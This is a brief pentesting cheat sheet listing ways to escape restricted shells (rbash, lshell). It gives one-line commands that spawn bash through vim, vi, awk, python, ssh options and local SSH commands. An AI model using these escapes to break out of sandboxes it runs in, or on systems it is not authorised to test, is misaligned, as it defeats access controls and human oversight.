# Restricted Shell Escapes

* Determine what shell you are currently running in&#x20;

```
echo $0 echo $SHELL
```

## -rbash

* List commands you are permitted to run&#x20;

```
compgen -c
```

### Escapes

#### VIM

```
vim 
:set shell=/bin/bash 
:shell
```

#### VI

```
vi 
:set shell=/bin/bash 
:shell
```

#### AWK

```
awk 'BEGIN {system("/bin/bash")}'
```

#### Python

```
python -c 'import os; os.system("/bin/bash");'
```

### SSH

```
ssh ryuu@$host -t 'bash --noprofile' 
ssh ryuu@$host -o ProxyCommand=';sh 0<&2 1>&2' x
```

#### Local SSH (SSH to yourself specifying command

```
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
```

#### lshell

```
echo os.system('/bin/bash')
```
